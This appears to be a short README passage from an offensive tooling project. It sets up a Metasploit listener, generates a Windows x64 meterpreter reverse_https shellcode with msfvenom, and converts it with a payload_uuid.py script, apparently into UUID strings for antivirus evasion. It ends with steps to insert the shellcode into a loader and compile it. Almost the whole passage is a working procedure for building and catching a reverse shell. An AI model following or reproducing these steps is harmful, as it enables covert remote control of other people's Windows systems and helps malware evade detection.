```
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST eth0; set LPORT 443; exploit"
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=eth0 LPORT=443 -f raw -o shell.bin
python3 payload_uuid.py -p shell.bin > shell.txt
```
In notepad++ Ctrl+h in Replace tab add in Find what field ^(.*)$ and in Replace with field "\1",
Remove from the last line the comma.
<br>
<br>
![image](https://github.com/user-attachments/assets/6c6aeb08-b354-4f0a-9e07-7adb1fc12b80)
<br>
<br>
Add the final shellcode to the "Shellcode" variable.
Compile as Release .
<br>
<br>
![image](https://github.com/user-attachments/assets/6c770e2f-f0c7-4a4b-98ab-a6496ead6438)

